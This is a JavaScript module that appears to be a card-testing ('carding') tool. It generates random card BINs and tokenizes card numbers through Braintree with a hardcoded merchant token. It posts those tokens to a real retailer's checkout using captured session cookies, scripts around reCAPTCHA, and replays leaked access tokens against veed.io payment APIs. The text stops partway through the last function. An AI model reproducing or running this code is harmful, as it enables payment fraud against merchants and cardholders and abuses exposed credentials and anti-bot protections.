import * as cheerio from 'cheerio';

export async function get_tokens() {
    try {
        const request_get_bin_site = await fetch('https://www.vccgenerator.org/credit-card-validator/', {
            method: "GET",
        });

        // Get the response body as text (HTML)
        const response_get_bin_site = await request_get_bin_site.text();

        // Extract cookies from the response headers
        const cookies = request_get_bin_site.headers.get('set-cookie');

        // Extract CSRF token from the Set-Cookie header using a regex
        const xcsrfToken = cookies.match(/csrftoken=([^;]+)/)[1];

        // Load the HTML into Cheerio to parse it
        const $ = cheerio.load(response_get_bin_site);

        // Get the CSRF token value from the input field (if it's present in the HTML)
        const csrfToken = $('input[name="csrfmiddlewaretoken"]').val();

        // Return both tokens and the cookies
        return {
            csrfToken,      // CSRF token from the HTML (if exists)
            xcsrfToken,  // CSRF token from the cookie header 
        };
    } catch (error) {
        console.error("Error fetching tokens:", error);
        return { error: error.toString() };
    }
}

export async function check_bin(CsrfToken, XcsrfToken, bin, startTime) {

    console.log(`\n\n ✔  token   : ${CsrfToken} \n ✔  x-token : ${XcsrfToken} \n ✔  bin     : ${bin}`)

    try {
        const bin_request = await fetch("https://www.vccgenerator.org/fetchdata/get-bin-info/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.5",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "x-csrftoken": `${XcsrfToken}`,
                "x-requested-with": "XMLHttpRequest",
                "cookie": `csrftoken=${CsrfToken}`,
                "Referer": "https://www.vccgenerator.org/bin-checker/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            "body": `bincode=${bin}`,
            "method": "POST"
        });

        // Check if the request was successful
        if (!bin_request.ok) {
            throw new Error(`HTTP error! status: ${bin_request.status}`);
        }

        // Parse response as JSON
        const bin_response = await bin_request.json();

        console.log(` ✔  issuer  : ${bin_response?.binInfo?.issuer === "N/A" || bin_response?.binInfo?.issuer === undefined ? "none" : bin_response?.binInfo?.issuer}\n ✔  status  : ${bin_response?.binInfo?.country_name_x === "N/A" || bin_response?.binInfo?.country_name_x === undefined ? "faild" : "success"} `)

        const endTime = performance.now(); // Record end time
        const timeTaken = (endTime - startTime) / 1000; // Time in seconds
        const truncatedTime = Math.floor(timeTaken * 100) / 100;

        console.log(`\n\n ✔  time takes ${truncatedTime}s `)

        console.log(`\n-------------------------------------------------`)

        return bin_response

    } catch (error) {
        console.error('Error in check_bin:', error);
        return { error: error.toString() };
    }

}

export function generateNumber(repeat, only_visa, only_master) {

    function make_num(only_visa, only_master) {
        // Randomly choose whether to start with 4 or 5
        const firstDigit = only_visa ? 4 : only_master ? 5 : Math.random() < 0.5 ? 4 : 5;
        //  Math.random() < 0.5 ? 4 : 5;

        // Randomly decide if 4 or 5 digits should remain the same
        const length = only_visa ? 4 : only_master ? 5 : Math.random() < 0.5 ? 4 : 5;

        // Generate the rest of the number
        let number = firstDigit.toString();

        // Add digits based on the selected length
        for (let i = 1; i < length; i++) {
            number += Math.floor(Math.random() * 10);
        }

        // Add random digits to complete the 6-digit number
        while (number.length < 6) {
            number += Math.floor(Math.random() * 10);
        }

        return parseInt(number);
    }

    const my_num = [];

    for (let i = 0; i < repeat; i++) {
        const number_by_make_num = make_num(only_visa, only_master);
        my_num.push(number_by_make_num);
    }

    console.log(` ✔ BINS :  ${my_num}`)

    return my_num

}

export async function graphql(cc, em, ey, cvv) {

    const request_brain = await fetch("https://payments.braintree-api.com/graphql", {
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.7",
            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYwNTI4NTAsImp0aSI6IjlhZmRmMDg2LTM3NjUtNDhmYS1hYmZjLTM0ZWQxNmNlNTI4MCIsInN1YiI6InFyOG45NjdmdnB2MmhxM3EiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InFyOG45NjdmdnB2MmhxM3EiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQXZlcnlVU0Vjb21tZXJjZSJ9fQ.T3BNe8m9Nd9LIHT8FrvrcloLR7xstBlw0SqwTjF6kbE5_55_JT6vM5xNMvkzOsnWNkslUWz0mGz20QQZN4xKbg",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sec-gpc": "1",
            "Referer": "https://assets.braintreegateway.com/",
            "Referrer-Policy": "strict-origin-when-cross-origin"
        },
        "body": JSON.stringify({
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "b80e3e58-a116-47c0-aa62-4e3621a58c15"
            }, "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": em,
                        "expirationYear": ey,
                        "cvv": cvv
                    },
                    "options": { "validate": false }
                }
            }, "operationName": "TokenizeCreditCard"
        }),
        "method": "POST"
    });

    const request_brain_json = await request_brain.json()

    return request_brain_json
}

export async function payment_information(tokencc) {

    const response = await fetch("https://cart.avery.com/rest/default/V1/carts/mine/payment-information", {
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.7",
            "content-type": "application/json",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-gpc": "1",
            "x-requested-with": "XMLHttpRequest",
            "cookie": "_dycnst=dg; _dyid=1702360905684752925; _dy_geo=IN.AS.IN_DL.IN_DL_New%20Delhi; _dy_df_geo=India..New%20Delhi; _dy_toffset=0; _dy_cs_dygroup=Dynamic%20Yield%20Experiences; _dyid_server=1702360905684752925; consumerId=8ae8804890dfd1200191c3f6b9e93a48; btid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb25zdW1lcklkIjoiOGFlODgwNDg5MGRmZDEyMDAxOTFjM2Y2YjllOTNhNDgiLCJpYXQiOjE3MjU1Njk2MTN9.XFZRwPY2cSzJZ6dfvVTOuCzWJp-SXGJ1qP2f4yKHso8; avy_ic=1; form_key=UuJHNrpAN5ui6M8m; avy_it=34.42; wwjH7clZ8E5v5BsgCqQ5zHYf9OlZ8dCB=NjA5MWVmYmU5ZTdhNmI2ZjA4NTFkYjYwYWU1ZmU4MWM6MTcyNjg0MzczOTAwMDo2YjY2Zjg0MjRhMjAzNTk2M2UyZTU3MmE2ZjkzYzU5NQ; _dycst=dk.w.c.ss.; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; section_data_clean=; form_key=UuJHNrpAN5ui6M8m; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; PHPSESSID=ou5cgmsvcqqbdna70sth9b7tr4; customerType=n; _dyjsession=nkuk7ewuss6p9ss2bpwpe6mcsh3oe0zg; dy_fs_page=cart.avery.com%2Fcheckout; _dy_csc_ses=nkuk7ewuss6p9ss2bpwpe6mcsh3oe0zg; _dy_cs_cookie_items=_dy_cs_dygroup; _dy_soct=1725637390!1229927.0'1302253.0'1342500.-67825'1342505.-67734'1342506.-67722'1342507.-67732'1992460.0'2158187.-67825'2255143.0'2255146.0'2255147.0!nkuk7ewuss6p9ss2bpwpe6mcsh3oe0zg~615860.-67825'615861.0'767394.0; intent_audience=low; private_content_version=452c4163ed8841b039f6aafd37fa4961; X-Magento-Vary=7715dd48a90eedde1911d0bf53ed42945fa94d5ff3fbf4aa170156ae93c946b7; section_data_ids={%22customer%22:1725637388%2C%22compare-products%22:1725637388%2C%22last-ordered-items%22:1725637452%2C%22cart%22:1725637452%2C%22directory-data%22:1725637388%2C%22captcha%22:1725637452%2C%22wishlist%22:1725637388%2C%22instant-purchase%22:1725637452%2C%22loggedAsCustomer%22:1725637388%2C%22multiplewishlist%22:1725637388%2C%22persistent%22:1725637388%2C%22review%22:1725637388%2C%22cordial%22:1725637452%2C%22recently_viewed_product%22:1725637388%2C%22recently_compared_product%22:1725637388%2C%22product_data_storage%22:1725637388%2C%22paypal-billing-agreement%22:1725637388}",
            "Referer": "https://cart.avery.com/checkout/",
            "Referrer-Policy": "strict-origin-when-cross-origin"
        },
        "body": JSON.stringify({
            "cartId": "6770850",
            "billingAddress":
            {
                "customerAddressId": "1494781",
                "countryId": "US",
                "regionId": "12",
                "regionCode": "CA",
                "region": "California",
                "customerId": "2936899",
                "street": ["1600 Fake Street",
                    "Apartment 1"],
                "company": "Fake Company",
                "telephone": "6019521325",
                "fax": null,
                "postcode": "94043",
                "city": "Mountain View",
                "firstname": "Jon",
                "lastname": "Doe",
                "middlename": null,
                "prefix": null,
                "suffix": null,
                "vatId": null,
                "customAttributes": [],
                "saveInAddressBook": null
            }, "paymentMethod": {
                "method": "braintree",
                "additional_data": {
                    "payment_method_nonce": `${tokencc}`,
                    "device_data": "{\"correlation_id\":\"b833a05562bec0fab54f4264f0eb1aca\"}",
                    "is_active_payment_token_enabler": true
                }
            }
        }),
        "method": "POST"
    });

    const response_json = await response.json()

    return response_json
}

export async function bypassCaptcha() {
    try {
        // Step 1: Fetch the captcha page and extract the token from the HTML
        const response = await fetch(
            "https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa&co=aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=wtef4lvtnlmf"
        );

        const html = await response.text();
        const tokenMatch = html.match(/type="hidden" id="recaptcha-token" value="(.*?)"/);
        const token = tokenMatch ? tokenMatch[1] : null;

        if (!token) {
            throw new Error("Failed to get captcha token");
        }

        // Step 2: Set up headers and data for the second request
        const headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.google.com",
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
            "referer": "https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa&co=aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=wtef4lvtnlmf",
        };

        const data = new URLSearchParams({
            v: "pCoGBhjs9s8EhFOHJFe8cqis",
            k: "6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa",
            reason: "q",
            c: token,
            co: "aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.",
            hl: "en",
            size: "invisible",
            chr: "[79,17,39]",
            vh: "19287791902",
            bg: "3tig2N0KAAQVCIdpbQEHnAbQ-_ld0wKQtuUGdgz48tMdDG6Y37QSVQk6saWxLfzmLQ5n-wnTHIukPYy-zt1XevEoVPWoFpnmZ-i6-qXpwbOeWrOSuEY12k7KPqJIuX43u3MNY6yz34uOcOcUKo2TbasUbkdS-PbYSN3A64RjZORV6JhpMdgZE0NOh8m5ssYkkefHJVLzzzyC2qZrMw5E3bWfbwqQAwY5vyzhqPHDO649RbxxsuLnfFTmXhL2xRZREFtasghBUoP9XF5aUw8IlGtYcDsxqPFcpw8-Jl_34aZeS40Ot830hrxvjGjVFnraz0iKuvN4V65CA_CLyzprxBVXttv-KhKVsspHMhEJ5npvyhmsEkLJA_DYP1eyU1tDcPMcjhbN_WFLgkvfiXC995iE-pi2GdaWHgY7-3VP19CR_gNCyUZ2FAn9UFf4z6vkDe9hkiC3kXLWsjrVEiwV79DDDaHSIQ9dKaNOVzckZhX4A-YeYPfBiZSQ22y7Lwmsyw3xkt1rqF5gL_eFUNXQfbi4u18ZvkFkixLnUvnpG-ZG1WuzEFb34NchNmb-3pWIrjpnV4ANlhsYTkSZiGwzdXiaVKoklBuBL01666y0H7Ie7A9oMHYyWmn1oMrt0_pEWRwr8BPQVNEULIqe0QGa6u6JMrPZ8IIKpBa4LSPRxempn2kSX1QaFqqsNrQUr6a4RiM4-RxPg4ZJwdfuIxDYNY5ywFIRrUHFxz_VN7bmH9ipbdAINBL7J9l1xvh369GFYUpMw1uL8hhanqHqNPq58s73U8DOtLclMtHiQcgfizvVCkljGY3Db1OSxjQ5ySy_amva91ms4LwBWTJlcWKDOlDXiKWtGYYJrxj78Z5KNRodG05EJHgBBmYQU2nxA6RAVWC2Z7hzIIZ01NYvDrcDfrtag7a2qpy4RVQI5QlB6hhJrzek4uZSxcwV-xWKcvvmKjOyExcTJ-zNrJ5h-oVUgonI7PFd4GPD04yHJM6ifivohRVJOVtBHbYh1l2sdG4wnNdQrqgJta9aR8PMVmzB93ZxN5sJGZmNQJ1OLsOonYHd80YR3Bu8OzeweoMOmhIrk-j5_bMI483_l-roGZR8uDoekYl_1sJwwyQnhhgyBLqGw-xERL1oQrLw7Ls_Q3cgCAuZwVKr32fa1SlJYjWGPnX7TE72X82P9bCCHr2yNTJSzGFlPYUsk5tnEDxqw_fW27ZOu4zLdiyuAY1fpMHyx6-W9_9TY9jKtYn6pC5VnIZeZO_SG-NjDj2SsdgITHHOWfrM43cnECYuUVdKD_6H3OUoNTXfnkjzQ54kNxTmtbW1Iq4FNWFYPyi6MCpZU1mGusylxvrCJQdsG7oy3bSSRq47LTPwC3NFjE7twA9r-NOdQj7XOqNyAWLz_ebp7Dsp_r6Bkk9cPn0fBkNJw9tUFPOhchSPFFUO8yzteBviuwhVKQVC2RsTfPYF4SZg0snpmoVWqr2xYyakB9KLNZO_Rjroyr5o9_K2oYcAkqKVoWTQF3VvQn9X3QcR82F6qVomyLly4b3HJcX32cojip8ubD-xycaYKjWjFrynyCDRGl7rJTlmpIBoi098iGFUNwVBrbgbpjaaOsx-LA490Nl-OFf8JF0cWWcBd_MWlJeVsyGamzXMQMO8rJ9EbYwWhDwAJ3VEupsVgPG-EOefqN9AUP9m-IAhvVi4JWchxhr4i2fN-mils-F5zPzMQT9igGj3VOYcAjp500IdikQViZ1Xfg6aVH1nIuXbeZdTLgFQq3y3RJR1Fb23KoXMJkqBnAowzy5bctoNGpSLcCrDXxuX5g9G3OKYpr54rtvYdxyi80rOSUdRyJA_dszrbw2t-h2KVtvhAxu3Zp7A73eo0EPMVvL2uynAEaX0l4NrqeIgwwMKadjxRcvJ-u6eTqNUUTAGyGtuzaK04sJpuJ3ZzZ_NCzcVpYDarNHngydlsYJzfJreVWfat-Ebjg-ofUAJhi4xq2h18PArHDcSjrqzZUtGyGaKLAVaK2pAGJRz6zgSVSHdFpssKzvltHfriqN61WKVruAVFjfC4kWM4hlaC_IE7AjztE7Vf3R8xtKts2jYbN6YLQsiLsW1t7_q-ewQJjNbyDKF1AC-c7v3t2r9-dHzvi_hroHsZO9_MlAYJNfxOMq3oKVXJnMl8O415yU7OwhNenIXyRYfoktTL5LKYY6uk1HX2Dt6wuOGvhoWnrpUpJtSIz7l532yiQqOtLgYS3EtE2h2Yh0IK3qGk4zxfpxqROyYhcRKCzMwuFYkFJ7gtl5jVsk8IwnrJ7RpiaAqyOWxvsURMfv3KjzWGd2kLhKR7TYL8qLCwlv5PNgyqd9LTYDK4g"
        });

        // Step 3: Make the second request to get the actual token
        const captchaResponse = await fetch(
            "https://www.google.com/recaptcha/api2/reload?k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa",
            {
                method: "POST",
                headers: headers,
                body: data,
            }
        );

        const captchaText = await captchaResponse.text();
        const rrespMatch = captchaText.match(/\["rresp","(.*?)"/);
        const captchaToken = rrespMatch ? rrespMatch[1] : null;

        if (!captchaToken) {
            throw new Error("Failed to retrieve CAPTCHA response.");
        }

        // Return the CAPTCHA token as JSON
        return { captchaToken };
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}

export async function getRandomUser() {

    try {
        // Step 1: Fetch random user data from the API
        const response = await fetch("https://randomuser.me/api?nat=us");

        if (!response.ok) {
            throw new Error("Failed to fetch random data from API.");
        }

        // Step 2: Parse the JSON response
        const data = await response.json();
        const user_info = data?.results ? data.results[0] : null;

        if (!user_info) {
            throw new Error("No user data found.");
        }

        // Step 3: Extract user details
        const first_name = user_info.name.first;
        const last_name = user_info.name.last;
        const email = `${first_name}.${last_name}@yahoo.com`;

        // Step 4: Return the user information in JSON format
        return { first_name, last_name, email }

    } catch (error) {
        // Handle errors and return a 500 status code with the error message
        res.status(500).json({ error: error.message });
    }
}

export async function getStripeData() {
    const api_url = "https://m.stripe.com/6";

    try {
        // Step 1: Send POST request to the API
        const response = await fetch(api_url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
        });

        if (!response.ok) {
            throw new Error("Failed to fetch stripe data");
        }

        // Step 2: Parse the JSON response
        const json_data = await response.json();

        // Step 3: Extract required data
        const muid = json_data?.muid || null;
        const guid = json_data?.guid || null;
        const sid = json_data?.sid || null;

        if (muid && guid && sid) {
            // Step 4: Return the extracted data
            return { muid, guid, sid };
        }

        throw new Error("Stripe data incomplete");
    } catch (error) {
        // Step 5: Handle errors and return 500 status with the error message
        return res.status(500).json({ error: error.message });
    }
}

export async function get_card_info(ccn) {

    // const { ccn } = req.query; // Fetch credit card number from query parameters

    if (!ccn) {
        return res.status(400).json({ error: "Credit card number is required" });
    }

    const url = `https://lookup.binlist.net/${ccn}`;

    try {
        // Step 1: Fetch card information from the Binlist API
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
        });

        if (!response.ok) {
            throw new Error("Failed to fetch card information");
        }

        // Step 2: Parse the JSON response
        const data = await response.json();

        // Step 3: Extract the required fields
        const bank = data?.bank?.name || null;
        const country = data?.country?.alpha2 || null;
        const card_type = data?.type ? capitalizeFirstLetter(data.type) : null;
        const brand = data?.scheme ? capitalizeFirstLetter(data.scheme) : null;

        if (bank && country && card_type && brand) {
            // Step 4: Return the card information
            const cardInfo = {
                bank,
                country,
                type: card_type,
                brand,
            };
            return cardInfo;
        }

        throw new Error("Incomplete card information");

    } catch (error) {
        // Step 5: Handle errors
        return res.status(500).json({ error: error.message });
    }

    function capitalizeFirstLetter(string) {
        return string.charAt(0).toUpperCase() + string.slice(1);
    }

}

export async function confirm_payment(pm, startTime) {

    const myHeaders = new Headers();
    myHeaders.append("accept", "*/*");
    myHeaders.append("accept-encoding", "gzip, deflate, br, zstd");
    myHeaders.append("accept-language", "en-US,en;q=0.9");
    myHeaders.append("content-length", "0");
    myHeaders.append("cookie", "VEED_LOCALE=en; GCLB=CLv4oNyw_4XxVBAD; intercom-id-j76wdp4u=2898e3f0-fac3-4927-afa4-125412156d4e; intercom-device-id-j76wdp4u=17a5cd15-62b3-402a-b7bd-40be9d1ea53f; __stripe_mid=2a5d10ff-3716-4f11-89b8-4846e043468a78c3ee; www_veed_io_refresh_token=O3QRSyjS7tnxk6pvEhwKLhIEY1nkV1Yf; ab.storage.userId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22e2363cf6-13f5-4a2a-b0d6-c99d6793f18f%22%2C%22c%22%3A1725959855581%2C%22l%22%3A1725959855590%7D; ab.storage.deviceId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22bb59b159-7a0a-28ff-f4d4-786bc2445299%22%2C%22c%22%3A1725959855596%2C%22l%22%3A1725959855596%7D; ph_phc_Wl8ChnwAGPJn8HE6ZcVBIvnmHXFZL4GcF94U0IV1DC8_posthog=%7B%22distinct_id%22%3A%22e2363cf6-13f5-4a2a-b0d6-c99d6793f18f%22%2C%22%24sesid%22%3A%5B1725960108870%2C%220191db34-34d5-7fda-9d7a-23f624ed5303%22%2C1725959517397%5D%7D; ab.storage.sessionId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22bcae32a0-e374-8409-a973-21edbedce1e9%22%2C%22e%22%3A1725961910529%2C%22c%22%3A1725959855587%2C%22l%22%3A1725960110529%7D; intercom-session-j76wdp4u=Wko1YlBtQW9tSzUyVWhYU3FOVnVTYkYyNmlkNEUrQzZvWkV6Qjl6bjByWGZjOHoyOU40djdBOVhBWUM3QzJrOS0tUWlSSTMvbUwwbThCL25wc1Y3R3hWQT09--2f848a11c1612661ee84320cdff72cc6932078a8; www_veed_io_user_meta=eyJleHAiOjE3MjU5NjM1MDEsImlhdCI6MTcyNTk2MjYwMSwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; user_meta=eyJleHAiOjE3MjU5NjM1MDEsImlhdCI6MTcyNTk2MjYwMSwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; AMP_47f1934446=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIzMWQwODc4Mi1mY2YyLTRkZTYtOTNlOS0xZTdlNjFiMGRmYzAlMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJlMjM2M2NmNi0xM2Y1LTRhMmEtYjBkNi1jOTlkNjc5M2YxOGYlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzI1OTU5NTE3MzU1JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyNTk2MzYxMTU2OCUyQyUyMmxhc3RFdmVudElkJTIyJTNBMTEwJTdE; user_meta=eyJleHAiOjE3MjU5NjQ5NDAsImlhdCI6MTcyNTk2NDA0MCwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; www_veed_io_access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjU5NjQ5NDAsImlhdCI6MTcyNTk2NDA0MCwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0.AtfyTSE9F3oVYjdG88Igln1Cilt9Yo6wNSj86kq62UTzV8o_2xP19N1JuvyrZUfY4sNRVSzYlf3z40o9dLy5O2m1M2UcKLTELNMR8YXkfOPzkNkVNKnX-3KoXh7HSvpmukWdGFDWqCVHhb8uVjq2RbbUQO66YOzb-Qm-8Yng_FoSokiBJk_ax9FKQ3hnwhzbZtDkzfLEInZ-RVy0MGwJP6kovRtdlFw2P-g78XILfPeu-vXOIY81OvEaaYi0aCIW3doR1pPNcssJZIX0Wf5KuPITeb-U_yoiKD7x2t3o7i3brW0KbAxBL6XSsCcjoXws81HeA8AkHFv2gE10B4605I0jSGhcfE6tJPyE0fsVON4419BG4f1Bzxrotnu0X8ARmhWJ2RRzJFt9w7OJIM90QjfWbcSGvBbj0S1EGIjTsbTFByL1gqousZME77qNFFPzjq7P-XKliqmjXqiTDK7gmhYBNRXZ1TnQmu9haLP5a5WttBw1xBfKMk4pLcSF_deBgv8f17v2r15p9emE6SCWD15Q-sTMdqFcVpM9I-aXlOYgfJ1hgVKQXo2XE2kXFAWsaecG7IB5XLKZBh0sJzh9Urw9Mh68JmI9iQfR4WyUYfT4iy7hwIagLdjUq1iKCkwDfQXIK6fj1TLnS6okOaKYIVghINoLruWVvI8bOS2fdII; www_veed_io_user_meta=eyJleHAiOjE3MjU5NjQ5NDAsImlhdCI6MTcyNTk2NDA0MCwic3ViIjoiZTIzNjNjZjYtMTNmNS00YTJhLWIwZDYtYzk5ZDY3OTNmMThmIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D");
    myHeaders.append("origin", "https://www.veed.io");
    myHeaders.append("priority", "u=1, i");
    myHeaders.append("referer", "https://www.veed.io/");
    myHeaders.append("sec-ch-ua", "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"");
    myHeaders.append("sec-ch-ua-mobile", "?0");
    myHeaders.append("sec-ch-ua-platform", "\"Windows\"");
    myHeaders.append("sec-fetch-dest", "empty");
    myHeaders.append("sec-fetch-mode", "cors");
    myHeaders.append("sec-fetch-site", "same-origin");
    myHeaders.append("sec-gpc", "1");
    myHeaders.append("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36");

    const requestOptions = {
        method: "POST",
        headers: myHeaders,
        redirect: "follow",
        credentials: "include"  // Ensures cookies are included in the request and handled by the browser
    };

    // Fetch call to refresh the token
    const refresh_cookies = await fetch("https://www.veed.io/api/v1/auth/token/refresh", requestOptions)
    const cookie = refresh_cookies.headers.get('set-cookie')

    // console.log(cookie)

    console.log(cookie ? `\n ✔ cookies  : true` : ` ✔ cookies  : false`);  // This will print cookies for your current domain, not veed.io

    const subscription_route = await fetch("https://www.veed.io/api/v1/subscriptions", {
        "headers": {
